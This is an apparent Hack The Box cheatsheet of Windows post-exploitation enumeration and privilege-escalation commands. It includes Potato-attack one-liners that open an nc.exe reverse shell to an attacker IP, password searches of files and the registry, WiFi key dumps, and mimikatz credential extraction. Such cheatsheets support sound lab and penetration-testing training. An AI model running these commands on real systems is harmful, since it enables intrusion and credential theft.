# Windows Enumeration Cheatsheet

Post-exploitation enumeration commands for Windows machines on HTB.

## System Information

```powershell
# System info
systeminfo
hostname
[System.Environment]::OSVersion

# Architecture
$env:PROCESSOR_ARCHITECTURE

# Patches/Hotfixes
wmic qfe list
Get-HotFix

# Environment variables
set
Get-ChildItem Env:
```

## Users and Groups

```powershell
# Current user
whoami
whoami /all
whoami /priv

# Local users
net user
Get-LocalUser

# Specific user
net user username

# Local groups
net localgroup
Get-LocalGroup

# Group members
net localgroup Administrators
net localgroup "Remote Desktop Users"
net localgroup "Remote Management Users"

# Domain users (if domain-joined)
net user /domain
net group /domain
net group "Domain Admins" /domain
```

## Network

```powershell
# Interfaces
ipconfig /all

# Routes
route print

# Connections
netstat -ano
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}

# ARP table
arp -a

# DNS
ipconfig /displaydns

# Firewall
netsh advfirewall show allprofiles
netsh advfirewall firewall show rule name=all

# Shares
net share
```

## Processes and Services

```powershell
# Running processes
tasklist /v
Get-Process

# Services
net start
sc query state= all
Get-Service | Where-Object {$_.Status -eq "Running"}

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"

# Service permissions
sc qc ServiceName
accesschk.exe -ucqv ServiceName

# Scheduled tasks
schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}

# Installed programs
wmic product get name,version
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*
```

## File System

```powershell
# Find interesting files
dir /s /b C:\*.txt 2>nul
dir /s /b C:\*.ini 2>nul
dir /s /b C:\*.config 2>nul
dir /s /b C:\*.bak 2>nul

# Search for passwords in files
findstr /si "password" *.txt *.ini *.config *.xml
findstr /spin "password" *.*

# Alternate Data Streams
dir /r

# PowerShell history
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-Content (Get-PSReadLineOption).HistorySavePath

# SAM/SYSTEM backups
dir C:\Windows\System32\config\RegBack\
dir C:\Windows\repair\
```

## Registry

```powershell
# AutoLogon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# Saved credentials
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query "HKCU\Software\ORL\WinVNC3\Password"

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Stored credentials
cmdkey /list
```

## Privilege Escalation Vectors

```powershell
# Check privileges
whoami /priv
# Key privileges: SeImpersonatePrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege

# SeImpersonatePrivilege -> Potato attacks
.\PrintSpoofer64.exe -c "C:\temp\nc.exe 10.10.14.X 4444 -e cmd"
.\GodPotato.exe -cmd "C:\temp\nc.exe 10.10.14.X 4444 -e cmd"
.\JuicyPotatoNG.exe -t * -p "C:\temp\nc.exe" -a "10.10.14.X 4444 -e cmd"

# Unquoted service paths
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Weak service permissions
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

# DLL hijacking
# Check service binary paths and writable directories in PATH
echo %PATH%
```

## Automated Tools

```powershell
# WinPEAS
.\winPEASx64.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# SharpUp
.\SharpUp.exe audit

# PrivescCheck
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended
```

## Credential Harvesting

```powershell
# Saved credentials
cmdkey /list
runas /savecred /user:admin cmd.exe

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# Browser credentials
# Use tools like SharpChromium, SharpDPAPI

# DPAPI
mimikatz# dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\*

# LSA secrets (admin)
mimikatz# lsadump::secrets
```
